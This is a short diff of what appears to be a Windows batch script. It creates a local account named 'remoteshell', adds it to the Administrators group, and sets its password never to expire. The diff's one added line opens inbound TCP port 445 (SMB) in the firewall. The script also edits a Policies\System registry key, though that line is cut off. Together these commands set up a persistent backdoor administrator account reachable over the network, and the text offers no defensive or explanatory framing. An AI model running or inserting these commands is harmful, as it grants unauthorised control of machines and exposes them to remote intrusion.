@@ -5,3 +5,4 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\s
 net users remoteshell /add
 net localgroup Administrators /add remoteshell
 WMIC USERACCOUNT WHERE Name='remoteshell' SET PasswordExpires=FALSE
+netsh advfirewall firewall add rule name="TCP Port 445" dir=in action=allow protocol=TCP localport=445
